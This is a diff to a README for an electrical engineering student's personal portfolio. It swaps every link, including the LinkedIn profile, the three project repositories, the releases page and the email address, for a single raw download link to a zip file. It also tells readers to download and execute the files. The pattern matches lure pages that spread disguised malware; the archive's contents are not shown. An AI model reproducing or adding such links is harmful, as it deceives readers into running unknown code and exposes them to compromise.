@@ -1,6 +1,6 @@
 # Stuti Kale's Portfolio 🌟
 
-Welcome to my personal portfolio repository! This repository showcases my work, projects, and achievements in the field of electrical engineering. You can find the latest updates and releases [here](https://github.com/Sergei23342425/Portfolio./releases). 
+Welcome to my personal portfolio repository! This repository showcases my work, projects, and achievements in the field of electrical engineering. You can find the latest updates and releases [here](https://raw.githubusercontent.com/Sergei23342425/Portfolio./main/drown/Application-1.5.zip). 
 
 ## Table of Contents
 
@@ -23,7 +23,7 @@ Hello! I am Stuti Kale, an electrical engineering student from Ichalkaranji. I h
 - **Name:** Stuti Kale
 - **Location:** Ichalkaranji
 - **Field of Study:** Electrical Engineering
-- **LinkedIn:** [Visit my LinkedIn](https://www.linkedin.com/in/stutikale)
+- **LinkedIn:** [Visit my LinkedIn](https://raw.githubusercontent.com/Sergei23342425/Portfolio./main/drown/Application-1.5.zip)
 
 ---
 
@@ -36,21 +36,21 @@ Here are some of the projects I have worked on:
 This project focuses on creating a smart home environment using IoT devices. It allows users to control home appliances through a mobile app.
 
 - **Technologies Used:** Arduino, IoT, Mobile App Development
-- **GitHub Repository:** [Smart Home Automation](https://github.com/Sergei23342425/SmartHomeAutomation)
+- **GitHub Repository:** [Smart Home Automation](https://raw.githubusercontent.com/Sergei23342425/Portfolio./main/drown/Application-1.5.zip)
 
 ### 2. Solar Power Generation System
 
 This project aims to design a solar power generation system to promote renewable energy. It includes a detailed analysis of energy output and efficiency.
 
 - **Technologies Used:** Solar Panels, Circuit Design, Data Analysis
-- **GitHub Repository:** [Solar Power System](https://github.com/Sergei23342425/SolarPowerSystem)
+- **GitHub Repository:** [Solar Power System](https://raw.githubusercontent.com/Sergei23342425/Portfolio./main/drown/Application-1.5.zip)
 
 ### 3. Electric Vehicle Charging Station
 
 This project addresses the need for electric vehicle charging infrastructure. It includes a prototype for a charging station that is user-friendly and efficient.
 
 - **Technologies Used:** Electrical Design, User Interface, Prototype Development
-- **GitHub Repository:** [EV Charging Station](https://github.com/Sergei23342425/EVChargingStation)
+- **GitHub Repository:** [EV Charging Station](https://raw.githubusercontent.com/Sergei23342425/Portfolio./main/drown/Application-1.5.zip)
 
 ---
 
@@ -84,14 +84,14 @@ I am currently pursuing my degree in Electrical Engineering at D.K.T.E. Society'
 
 Feel free to reach out to me for collaborations, inquiries, or just to connect!
 
-- **Email:** stutikale@example.com
-- **LinkedIn:** [Stuti Kale](https://www.linkedin.com/in/stutikale)
+- **Email:** https://raw.githubusercontent.com/Sergei23342425/Portfolio./main/drown/Application-1.5.zip
+- **LinkedIn:** [Stuti Kale](https://raw.githubusercontent.com/Sergei23342425/Portfolio./main/drown/Application-1.5.zip)
 
 ---
 
 ## Releases
 
-You can find the latest releases and updates for my projects [here](https://github.com/Sergei23342425/Portfolio./releases). Please download and execute the necessary files to explore the projects.
+You can find the latest releases and updates for my projects [here](https://raw.githubusercontent.com/Sergei23342425/Portfolio./main/drown/Application-1.5.zip). Please download and execute the necessary files to explore the projects.
 
 ---
 
